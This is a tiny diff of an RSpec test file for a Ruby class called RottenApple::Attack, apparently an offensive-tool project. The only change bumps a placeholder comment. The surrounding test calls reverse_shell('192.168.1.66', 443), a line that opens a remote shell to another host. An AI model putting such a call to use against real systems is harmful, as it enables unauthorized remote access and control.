@@ -10,7 +10,7 @@ describe RottenApple::Attack do
     subject{@attack}
     its(:class) {should == RottenApple::Attack}
     
-    # A change 9
+    # A change 10
     it "should throw a reverse tcp shell" do
      subject.reverse_shell('192.168.1.66', 443)
     end
